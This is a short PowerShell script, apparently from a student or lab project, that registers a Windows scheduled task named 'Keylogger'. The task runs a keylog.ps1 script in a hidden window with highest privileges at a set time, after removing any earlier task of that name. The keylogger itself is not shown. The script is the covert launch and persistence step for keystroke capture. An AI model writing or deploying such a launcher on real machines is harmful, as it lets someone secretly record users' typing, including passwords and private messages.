Unregister-ScheduledTask -TaskName "Keylogger" -Confirm:$false
$action = New-ScheduledTaskAction -Execute "pwsh" -Argument "-WindowStyle hidden C:\Users\user\Documents\m2_minientreprise_scripts\scripts\keylog.ps1"
$trigger = New-ScheduledTaskTrigger -At 13:54 -Once
$principal = New-ScheduledTaskPrincipal -UserId "user" -RunLevel Highest
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
Register-ScheduledTask Keylogger -InputObject $task
